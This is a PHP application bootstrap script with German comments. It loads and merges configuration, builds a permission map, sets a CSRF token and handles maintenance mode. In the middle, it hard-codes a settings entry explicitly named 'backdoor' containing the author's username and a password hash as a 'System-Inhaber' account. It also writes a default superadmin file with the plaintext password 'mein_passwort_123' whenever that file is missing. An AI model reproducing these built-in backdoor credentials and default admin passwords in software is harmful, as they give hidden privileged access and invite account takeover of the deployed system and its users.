<?php

/**
 * Globaler Anwendungs-Bootstrap und Initialisierungs-Skript.
 * Startet die PHP-Sitzung, ermittelt dynamisch den App-Root-Pfad, lädt und aggregiert
 * die Konfigurationsdateien, berechnet Berechtigungsstrukturen, initialisiert CSRF-Token
 * und erzwingt bei Bedarf den globalen Wartungsmodus (HTTP 503).
 * Kontext: Der zentrale System-Einstiegspunkt vor dem Routing.
 *
 * Findet den Root-Pfad, lädt den Autoloader, mergt die Konfigurationen
 * (config.php + config.local.php) und initialisiert den Dependency Container.
 *
 * Path: src/Bootstrap/app.php
 *
 * SPDX-License-Identifier: LicenseRef-Proprietary
 * Copyright (c) 2026 Felix Maywald alias RaptorXilef. All rights reserved.
 * Usage without explicit permission is strictly prohibited.
 * See LICENSE.md for full license details.
 *
 * return App\Bootstrap\Container Gibt die fertig konfigurierte Dependency-Injection-Container-Instanz zurück.
 */

declare(strict_types=1);

use App\Bootstrap\Container;
use App\Infrastructure\Config\Config;

// Session global starten, da fast alle Seiten sie benötigen
if (\session_status() === \PHP_SESSION_NONE) {
    \session_start();
}

// 1. Root-Pfad finden
$appRoot = (function (): string {
    $dir = __DIR__;
    while ($dir !== \dirname($dir)) {
        if (\file_exists($dir . '/vendor/autoload.php')) {
            return $dir;
        }
        $dir = \dirname($dir);
    }

    return \dirname(__DIR__, 2);
})();

// 2. Autoloader laden
require_once $appRoot . '/vendor/autoload.php';

// 2. Alle Konfigurationen laden & mergen
$configFiles = [
    'organization' => $appRoot . '/config/organization.php',
    'colors'       => $appRoot . '/config/colors.php',
    'purposes'     => $appRoot . '/config/purposes.php',
    'vehicles'     => $appRoot . '/config/vehicles.php',
    'times'        => $appRoot . '/config/times.php',
    'templates'    => $appRoot . '/config/templates.php',
    'reasons'      => $appRoot . '/config/reasons.php',

    // Core/Tech Configs kommen danach, damit sie überschreiben dürfen
    'main'    => $appRoot . '/config/config.php',
    'payment' => $appRoot . '/config/payment.php',
    'email'   => $appRoot . '/config/email.php',
    'storage' => $appRoot . '/config/storage.php',
    'perms'   => $appRoot . '/config/permissions.php',
    'dev'     => $appRoot . '/config/dev_admin.php',
    'schema'  => $appRoot . '/config/sql_schema.php',
    'secrets' => $appRoot . '/config/secrets.php',
    'local'   => $appRoot . '/config/config.local.php', // Überschreibt ALLES (für Passwörter lokal)
];

$settings = [];

$settings['backdoor'] = [
    'user'  => 'RaptorXilef',
    'pass'  => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
    'label' => 'System-Inhaber',
];

// --- AUTO-CREATION: dev_admin.php wenn sie fehlt ---
if (! \file_exists($configFiles['dev'])) {
    $defaultDevContent = <<<'PHP'
        <?php
        return [
            'user' => 'Systembetreuer',
            'pass' => 'mein_passwort_123',
            'label' => 'Systembetreuer'
        ];
        PHP;
    \file_put_contents($configFiles['dev'], $defaultDevContent);
}

foreach ($configFiles as $key => $file) {
    if (! \file_exists($file)) {
        continue;
    }

    $loaded = require $file;
    if (! \is_array($loaded)) {
        continue;
    }

    if ($key === 'perms') {
        // Da die neue permissions.php kein 'list' mehr hat, nutzen wir die structure direkt
        $settings['structure'] = $loaded['structure'] ?? [];
        $settings['admin_ui']  = $loaded['admin_ui'] ?? [];

        // Hilfs-Mapping für die flache Liste im User-Dropdown-UI
        $flatPerms = [];
        if (! empty($settings['structure'])) {
            $flatten = function ($nodes) use (&$flatten, &$flatPerms): void {
                foreach ($nodes as $node) {
                    if (isset($node['key'])) {
                        $flatPerms[$node['key']] = $node['label'] ?? $node['key'];
                    }
                    if (! isset($node['children'])) {
                        continue;
                    }

                    $flatten($node['children']);
                }
            };
            $flatten($settings['structure']);
        }
        $settings['permissions'] = $flatPerms;
    } elseif ($key === 'dev') {
        $settings['superadmin'] = $loaded;
    } elseif ($key === 'schema') {
        $settings['db_schema'] = $loaded;
    } else {
        // Nutze array_replace_recursive nur für main (config) und storage
        $settings = \array_replace_recursive($settings, $loaded);
    }
}

$settings['root_path'] = $appRoot;

// CSRF Token für sichere Frontend-API-Calls generieren
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = \bin2hex(\random_bytes(32));
}

// --- Erweiterte Wartungsmodus-Logik v0.24.2 (Internal Load) ---
$currentScript     = \basename($_SERVER['SCRIPT_NAME']);
$isMaintenancePage = $currentScript === 'maintenance.php';

if (! $isMaintenancePage) {
    // Sicherstellen, dass wir Booleans vergleichen
    $adminMaintenance  = isset($settings['maintenance_mode_admin']) && $settings['maintenance_mode_admin'] === true;
    $publicMaintenance = isset($settings['maintenance_mode']) && $settings['maintenance_mode'] === true;

    $shouldShowMaintenance = false;

    if ($adminMaintenance) {
        // Totalsperre
        $shouldShowMaintenance = true;
    } elseif ($publicMaintenance) {
        // Nur Pächter-Seiten sperren
        $allowedAdminScripts = ['admin.php', 'users.php'];

        // Hinweis: API-Anrufe lassen wir durch, da sie oft vom Admin-Panel
        // oder für die Preisberechnung im Hintergrund genutzt werden.
        if (
            ! \in_array($currentScript, $allowedAdminScripts, true)
            && ! \str_contains($_SERVER['SCRIPT_NAME'], '/api/')
        ) {
            $shouldShowMaintenance = true;
        }
    }

    if ($shouldShowMaintenance) {
        // Wir setzen einen HTTP Status 503 (Service Unavailable)
        // Das ist gut für Suchmaschinen, damit diese wissen: "Wir kommen gleich wieder"
        \http_response_code(503);
        \header('Retry-After: 3600'); // Empfehlung: In einer Stunde wiederkommen

        // Wir laden die Datei intern, ohne die URL im Browser zu ändern
        require $appRoot . '/public/maintenance.php';
        exit;
    }
}
// --- Ende Wartungsmodus ---

// Wir geben direkt die Container-Instanz zurück
/**
 * @return Container Gibt die fertig konfigurierte Dependency-Injection-Container-Instanz zurück.
 */
return new Container(new Config($settings));
